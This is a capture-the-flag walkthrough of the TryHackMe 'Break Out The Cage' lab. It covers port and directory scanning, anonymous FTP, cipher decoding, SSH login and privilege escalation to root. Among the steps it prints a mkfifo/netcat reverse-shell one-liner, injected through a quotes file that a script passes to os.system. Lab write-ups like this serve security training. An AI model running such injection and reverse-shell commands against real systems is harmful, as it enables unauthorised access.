# Break Out The Cage

![an image of Nicolas Cage from the THM room](https://i.imgur.com/0MxLYQa.png)

[Play](https://tryhackme.com/room/breakoutthecage1)

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.8.184
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Info gathered:
- FTP running, with anonymous login
- SSH open
- HTTP open, running a website


### 1.2. Web Enumeration
I usually try out both of the below lists, to get a complete idea and not miss out on anything.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -x 'php,html,txt' -t 32 -q -u 10.10.100.66              
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/contracts            (Status: 301) [Size: 316] [--> http://10.10.100.66/contracts/]
/html                 (Status: 301) [Size: 311] [--> http://10.10.100.66/html/]     
/images               (Status: 301) [Size: 313] [--> http://10.10.100.66/images/]   
/index.html           (Status: 200) [Size: 2453]                                    
/scripts              (Status: 301) [Size: 314] [--> http://10.10.100.66/scripts/]  
/server-status        (Status: 403) [Size: 277]
```

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 32 -q -u 10.10.100.66 
/images               (Status: 301) [Size: 313] [--> http://10.10.100.66/images/]
/index.html           (Status: 200) [Size: 2453]                                 
/html                 (Status: 301) [Size: 311] [--> http://10.10.100.66/html/]  
/scripts              (Status: 301) [Size: 314] [--> http://10.10.100.66/scripts/]
/contracts            (Status: 301) [Size: 316] [--> http://10.10.100.66/contracts/]
/auditions            (Status: 301) [Size: 316] [--> http://10.10.100.66/auditions/]
```

Interesting looking things:
- contracts
- auditions
- sripts

### 1.3. Web Exploration
Website homepage
![homepage of the website](https://i.imgur.com/7rw5qo1.jpg)
All the links are dead.

`/contracts/`
![contracts directory showing a file](https://i.imgur.com/wFJbVW8.png)
Useless.

`/auditions/` an mp3 file found in the auditions directory. We can look into this later if needed.
![an mp3 file is seen in the auditions directory](https://i.imgur.com/E29Ojef.png)


### 1.4. FTP
Let's get the interesting looking file from FTP, as anonymous login is allowed.
```
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.100.66
Connected to 10.10.100.66.
220 (vsFTPd 3.0.3)
Name (10.10.100.66:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.08 secs (4.8631 kB/s)
ftp> 
221 Goodbye.
```

We get: ```UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQU{rest_is_yeeted_kekw}```

-base64->

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... {mmm_yum}
```

-[vingere](https://www.guballa.de/vigenere-solver)->

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... {yee_haww}
```
Now, what could the username be? Look at the questions in the THM room!

## 2. Foothold
Using SSH, we can login.
```
weston@national-treasure:~$ id
uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

Doing some preliminary exploration, we get:
```
weston@national-treasure:~$ find / -type f -group cage 2> /dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

Checking out the first file.
```
weston@national-treasure:~$ cat /opt/.dads_scripts/spread_the_quotes.py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

The second file is a list of quotes. Here's what's happening:
- the second file is opened
- we read the lines in the file, and split them by line-end-marker
- we store the lines in a variable called `lines`
- we choose one random item from a list
- os.system("wall xyz") displays the word xyz on all user's terminals.

Now, what could the possible paths to exploit be? I could think of python library hijacking if we have the right permissions. 

## 3. Priv Esc
### 3.1. Python Library Hijacking (FAIL)
```
weston@national-treasure:~$ ls -la /opt/.dads_scripts/.files/.quotes
-rwxrw---- 1 cage cage 347 Jun 13 10:30 /opt/.dads_scripts/.files/.quotes
weston@national-treasure:~$ ls -la /opt/.dads_scripts/spread_the_quotes.py
-rwxr--r-- 1 cage cage 255 May 26  2020 /opt/.dads_scripts/spread_the_quotes.py
```

I looked at the directory
```
weston@national-treasure:/opt/.dads_scripts$ ls -la
total 16
drwxr-xr-x 3 cage cage 4096 May 26  2020 .
drwxr-xr-x 3 root root 4096 May 25  2020 ..
drwxrwxr-x 2 cage cage 4096 May 25  2020 .files
-rwxr--r-- 1 cage cage  255 May 26  2020 spread_the_quotes.py
```

And clearly, we can not write our own files here. Fail.

### 3.2. Using `os.system()`

What if we can make use of the `os.system()` command? We have the right permissions to override the stuff in the quotes. We can thus put in a reverse shell spawner! 
```
weston@national-treasure:~$ echo "pwn; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.8.184 4444 >/tmp/f" > /opt/.dads_scripts/.files/.quotes 
```

... wait for it ...

![getting the reverse shell as cage user](https://i.imgur.com/x3iJD6C.png)

Nice :D

### 3.3. Vertical PrivEsc
Make sure to upgrade your shell using `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Looking at emails,
```
cage@national-treasure:~/email_backup$ cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
cage@national-treasure:~/email_backup$ cat email_2
cat email_2
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
cage@national-treasure:~/email_backup$ cat email_3
cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

{hidden :kekw:}

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```

Info gathered:
- {the_movie_name_in_first_email} can be a keyword
- sean == root
- "The note said: ..." could be another vingere cipher

Breaking the cipher using [this](https://www.boxentriq.com/code-breaking/vigenere-cipher), we get the password to root!

### 3.4. Complete Takeover
```
root@national-treasure:~/email_backup# cat email_1
cat email_1
From - SeanArcher@BigManAgents.com
To - master@ActorsGuild.com

Good Evening Master

My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
Eventually the whole world will see who Cage really is! Our masterplan is coming together
master, I'm in your debt.

Thank you

Sean Archer
root@national-treasure:~/email_backup# cat email_2
cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{mmm_tasty}

Thank you

Sean Archer
```

System Compromised!
